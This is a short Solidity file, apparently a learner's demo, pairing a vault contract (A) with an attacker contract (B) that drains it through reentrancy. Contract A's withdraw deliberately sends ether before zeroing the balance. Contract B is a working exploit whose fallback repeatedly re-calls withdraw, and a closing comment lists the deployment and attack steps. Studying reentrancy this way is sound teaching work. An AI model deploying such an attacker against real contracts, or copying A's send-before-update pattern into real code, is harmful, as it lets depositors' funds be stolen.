// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.6;

contract A {
    mapping (address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal>0);
        // 14 to 15.  take tmie to upate the blockhain. and its possibel these things should be work as loop 
        (bool sent,) = msg.sender.call{value:bal}("");
        require(sent, "failure");
        balances[msg.sender] = 0;
    }

    function getbalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract B {
    A public a;
    constructor(address _aAddress) {
        a = A(_aAddress);
    }

    fallback() external payable {
        if(address(a).balance >=1 ether){
            a.withdraw();
        }
     }

     function attack() external payable {
        require(msg.value >=1 ether);
        a.deposit{value:1 ether}();
        a.withdraw();
     }

     function getBalance() public view returns(uint) {
        return address(this).balance;
     }
}

/**
deply A smart contract 
copied adress of depoiyed A SC -- 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
deploye B smart contract usig  adress A SC 
deposite 5 ether from - oxaba ...
deposite 5 ether 0x4b2 .....
attack A from smart cntract by depositing 1 ther
*/